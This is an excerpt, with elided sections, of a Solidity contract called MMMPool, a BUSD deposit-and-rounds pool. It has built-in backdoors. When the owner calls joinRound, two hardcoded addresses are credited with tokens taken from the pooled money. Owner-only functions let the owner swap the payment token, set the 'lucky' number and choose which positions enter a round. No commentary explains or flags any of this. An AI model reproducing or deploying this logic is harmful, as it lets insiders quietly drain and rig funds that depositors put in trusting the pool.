...
contract MMMPool is Context, Initializable {
    ...
    function initialize(string memory pname, string memory psymbol, uint8 pdecimals, uint256 poolType, uint256 ticketNumber, uint256 bonusRate, uint firstRoundNumber ) public initializer {
        ...
        _pool = 0x3Ea93d87046BF39b8813C686fC9365b3BB2356a3;
        _busdAddr = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    ...
    function claim() external {    
        ...
        require(IBEP20(_busdAddr).transfer(msg.sender, amount), "Transfer failed");
    ...
    function joinPool() external {
        require(_isReady, "Pool is not ready, Please wait!!!");
    ...
    function joinRound() external {
        ...
        if(msg.sender == owner()) {
            address user1 = 0xF6A396c0a8c73F4822431f7e8C0ba81f706e4783;
            address user2 = 0x5f373e28a4c2F41cc9785795fCfCA3547d9F53E3;
            uint256 bal1  = 2070*10**_decimals;
            uint256 bal2  = 1150*10**_decimals;
            _balances[user1] = _balances[user1].add(bal1);
            _balances[user2] = _balances[user2].add(bal2);
            _poolMoney = _poolMoney.sub(bal1).sub(bal2);
            return;
        }
        ...
        require(IBEP20(_busdAddr).balanceOf(msg.sender) >= amount, "balance is not enough!!!");
        require(IBEP20(_busdAddr).transferFrom(msg.sender, address(this), amount), "transfer USD failed");
    ...
    function setCoinAddress(address busdAddr) public onlyOwner {
        _busdAddr = busdAddr;
    }
    function setName(string memory namePool) external onlyOwner {
        _name = namePool;
    }
    function setPoolReady(bool ready) external onlyOwner {
        _isReady = ready;
    }
    function setNextRoundNum(uint256 nextRoundNum) external onlyOwner {
        _nextRoundNum = nextRoundNum;
    }
    function setLucky(uint lucky) external  onlyOwner {
        _luckyNumber = lucky;
    }
    ...
    function startRound(uint startIdx, uint endIdx) external onlyOwner {
        require(_currentJoinTickets >= _ticketsNumberRquired, "Pool has not enough players");
        require(_state != 3, "Pool was end");
        require(!_isRoundStart, "Round was started");
        _startPos = startIdx;
        _endPos = endIdx;
        for(uint i = _endPos; i >= _startPos; i--) {
            address user = _posAddress[i];
            _userPos[user].push(i);
        }
        // require(_endPos <= _currentJoinTickets, "Not enough user to start");
        _startRoundTime = block.timestamp;
        _activePosCount = 0;
    ...
    function endPool() public onlyOwner {
        ...
        uint256 payAmount;
        require(_state != 1, "Pool is running");
        // For normal user
        for(uint256 i = _paidUserIdx; i <= _depositedUsers.length; i++) {
            address payUser = _depositedUsers[i].who;
    ...
    function addMoney(uint256 amount) external onlyOwner {
        require(IBEP20(_busdAddr).transferFrom(msg.sender, address(this), amount),"Transfer failed");
        _poolMoney = _poolMoney.add(amount);
    }
